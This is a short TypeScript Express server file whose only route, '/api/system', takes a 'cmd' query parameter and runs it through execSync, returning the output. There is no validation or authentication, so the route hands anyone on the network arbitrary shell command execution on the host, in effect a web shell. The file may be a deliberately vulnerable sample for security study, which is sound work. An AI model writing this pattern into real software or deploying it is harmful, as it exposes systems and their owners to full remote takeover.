import express, { Request, Response } from "express";
import { execSync } from "node:child_process";

const app = express();
const port = process.env.PORT ?? 3001;

app.get("/api/system", (req: Request, res: Response) => {
  const now = new Date().toUTCString();
  console.info(`${req.ip} - [${now}] ${req.method} ${req.url} `);

  let result = "";
  const cmd = req.query["cmd"];
  if (typeof cmd === "string") {
    result = execSync(cmd).toString();
  }

  res.send(result);
});

app.listen(port, () => {
  console.log(`Server is running at port ${port}`);
});
